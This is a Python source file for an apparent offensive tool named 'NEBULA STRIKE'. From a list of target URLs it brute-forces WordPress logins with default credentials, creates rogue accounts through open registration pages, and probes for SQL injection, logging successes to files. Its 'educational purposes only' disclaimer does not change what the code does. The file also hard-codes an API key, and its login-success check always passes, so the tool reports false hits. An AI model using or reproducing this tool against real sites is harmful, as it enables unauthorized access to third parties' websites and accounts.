import os
import requests
import time
from colorama import Fore, Style
from pyfiglet import figlet_format
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

API_KEY = "IEq9GmbMtcapALpiL9jOow9tz3WRRDjbALxaN1JxVIQ"
MAX_THREADS = 1500  # Increased to 600 threads
SQLI_THREADS = 1500  # Added for SQLi Detection

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f'''
{Fore.RED}
▒██   ██▒    ▄▄▄          ▄▄▄▄       ██▓   ▄▄▄█████▓
▒▒ █ █ ▒░   ▒████▄       ▓█████▄    ▓██▒   ▓  ██▒ ▓▒
░░  █   ░   ▒██  ▀█▄     ▒██▒ ▄██   ▒██▒   ▒ ▓██░ ▒░
 ░ █ █ ▒    ░██▄▄▄▄██    ▒██░█▀     ░██░   ░ ▓██▓ ░
▒██▒ ▒██▒    ▓█   ▓██▒   ░▓█  ▀█▓   ░██░     ▒██▒ ░
▒▒ ░ ░▓ ░    ▒▒   ▓▒█░   ░▒▓███▀▒   ░▓       ▒ ░░
░░   ░▒ ░     ▒   ▒▒ ░   ▒░▒   ░     ▒ ░       ░
 ░    ░       ░   ▒       ░    ░     ▒ ░     ░
 ░    ░           ░  ░    ░          ░
                               ░
{Fore.RESET}

{Fore.YELLOW} 👨‍💻 Author: @xabit | 🐙 GitHub: @sudoxabit | 📸 Instagram: @xabit___
🛠️ NEBULA STRIKE v1.0

This powerful tool is designed to assist security researchers in identifying and exploiting vulnerabilities efficiently. Featuring a robust set of capabilities, it includes:

🔍 SQL Injection Detector – Detects and flags potential SQL injection points.
🔒 WordPress Brute Forcer – Attempts to crack WordPress logins using brute force techniques.
📋 Default Credentials & Log Checker – Identifies websites using weak or default login credentials.
📝 Registration Exploiter – Exploits misconfigured WordPress registration pages for potential access.

📌 Usage: Provide a .txt file containing target URLs, and the tool will automatically scan and attempt exploitation where applicable.

⚠️ Disclaimer: This tool is intended for educational purposes only. Unauthorized use against live websites is strictly prohibited.
LETS MAKE THE WORLD SAFER{Fore.RESET}
'''
    print(banner)

def fix_formatting(url):
    if '|' in url:
        url = url.replace('|', '#').replace('#', '@', 1)
    return url.split('#admin@password123')[0]  # Fix to prevent unwanted suffix

def brute_force_site(url, username, password):
    login_url = url.rstrip('/') + '/wp-login.php'
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In'
    }
    try:
        response = requests.post(login_url, data=login_data)
        clean_url = url.split('#admin@password123')[0]  # Fix output format
        if "dashboard" in response.url or "/wp-admin" or "wp-admin/index.php"  in response.url:
            print(Fore.GREEN + f"[+] Success : {clean_url}" + Style.RESET_ALL)
            with open("loginsuccess.txt", "a") as f:
                f.write(f"{clean_url}\n")
        else:
            print(Fore.RED + f"[-] Failed to login on {clean_url}" + Style.RESET_ALL)
    except Exception as e:
        pass

def exploit_wp_register(url):
    register_url = url.rstrip('/') + '/wp-login.php?action=register'
    data = {
        'user_login': 'xxabitxploit_user',
        'user_email': 'nrnr551a@gmail.com',
        'wp-submit': 'Register'
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        response = requests.post(register_url, data=data, headers=headers)
        if response.status_code == 302 or "checkemail=registered" in response.text:
            print(Fore.GREEN + f"[+] Success : {register_url}#xxabitxploit_user" + Style.RESET_ALL)
            with open("register_success.txt", "a") as f:
                f.write(f"[+] {register_url}#xxabitxploit_user\n")
        else:
            print(Fore.RED + f"[-] Failed to create user on {register_url}" + Style.RESET_ALL)
    except Exception as e:
        pass

def sqli_detector(url):
    test_payloads = ["'", "' --+-", " --+-"]
    for payload in test_payloads:
        try:
            response = requests.get(url + payload)
            if any(error in response.text for error in [
                "SQL syntax", "mysql_fetch", "Unclosed quotation mark",
                "ORA-00933", "Incorrect syntax", "no such table"]):
                print(Fore.GREEN + f"[+] Possible SQL Injection on: {url}" + Style.RESET_ALL)
                with open("sqli_vulnerable.txt", "a") as f:
                    f.write(f"[+] {url}\n")
            else:
                print(Fore.RED + f"[-] No SQL Injection found on: {url}" + Style.RESET_ALL)
        except Exception as e:
            pass

def main_menu():
    clear_screen()
    print_banner()
    print(Fore.YELLOW + "Choose an option:" + Fore.RESET)
    print(Fore.YELLOW + "1. Enumerate users and crack passwords" + Fore.RESET)
    print(Fore.YELLOW + "2. Bruteforce based on file (sites and credentials)" + Fore.RESET)
    print(Fore.YELLOW + "3. Dark Portal - WP Register Exploiter" + Fore.RESET)
    print(Fore.YELLOW + "4. SQL Injection Detector" + Fore.RESET)
    print(Fore.YELLOW + "5. Exit" + Fore.RESET)

    try:
        option = int(input("Enter your choice (1, 2, 3, 4, or 5): "))
    except ValueError:
        print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)
        main_menu()
        return

    if option == 1:
        print("[+] Option 1 selected: Enumerate users and crack passwords")
    elif option == 2:
        target_file = input("Enter the file containing WordPress URLs: ").strip()
        with open(target_file, 'r') as file:
            for url in file:
                brute_force_site(fix_formatting(url.strip()), 'admin', 'password123')
    elif option == 3:
        target_file = input("Enter the file containing WordPress URLs: ").strip()
        with open(target_file, 'r') as file:
            for url in file:
                exploit_wp_register(url.strip())
    elif option == 4:
        target_file = input("Enter the file containing URLs for SQL Injection test: ").strip()
        with open(target_file, 'r') as file:
            for url in file:
                sqli_detector(url.strip())
    elif option == 5:
        print(Fore.YELLOW + "Exiting..." + Fore.RESET)
        exit()
    else:
        print(Fore.RED + "Invalid choice. Exiting." + Style.RESET_ALL)

    input("Press Enter to continue...")
    main_menu()

if __name__ == "__main__":
    main_menu()
